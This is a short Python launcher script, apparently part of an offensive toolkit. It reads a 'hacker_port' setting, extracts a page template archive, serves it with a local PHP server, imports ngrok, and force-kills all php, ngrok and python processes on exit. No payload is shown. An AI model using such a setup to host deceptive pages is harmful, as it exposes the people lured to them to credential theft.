import os
import subprocess
import sys
from pyngrok import ngrok
from colorama import Fore,init
import json
import zipfile
init()

os.system("cls")

def version():

    py_version = sys.version.split(' ')[0]
    if "3.8" in py_version:
        pass
    else: 
        print("Please Install python 3.8")
        sys.exit()


with open('config.json') as f:
    port = json.load(f)['hacker_port']


def Template():
    check_dir = os.listdir()
    if "Template" in check_dir:
        pass
    else:

        try:
            with zipfile.ZipFile("Template.zip","r") as zip_ref:
                zip_ref.extractall("Template")
                print(Fore.RED+" php.exe installation was successful ! ")

        except FileNotFoundError:
            pass


def phpserv():
    with open("logs/log.log","w") as phplog:
        subprocess.Popen(('php', '-S', 'localhost:'+port,'-t','template'), stdout=phplog, stderr=phplog) 
        print(Fore.GREEN+ " \n [+] php Server Started On port "+port+Fore.RED+" Link : "+Fore.WHITE+"http://localhost:"+port)


        try:
            input(Fore.GREEN+"\n [+] "+Fore.WHITE+"Press CTRL+C To Exit Or  (Press Enter)")
            with open("logs/exit.log","w") as kill:
                subprocess.Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
                subprocess.Popen(("taskkill","/F","/IM","ngrok*"),stderr=kill,stdout=kill)
                subprocess.Popen(("taskkill","/F","/IM","python*"),stderr=kill,stdout=kill)
            

                
        except KeyboardInterrupt:
            with open("logs/exit.log","w") as kill:
                subprocess.Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
                subprocess.Popen(("taskkill","/F","/IM","ngrok*"),stderr=kill,stdout=kill)
                subprocess.Popen(("taskkill","/F","/IM","python*"),stderr=kill,stdout=kill)
            print(" ")
            sys.exit()

version()
Template()
phpserv()



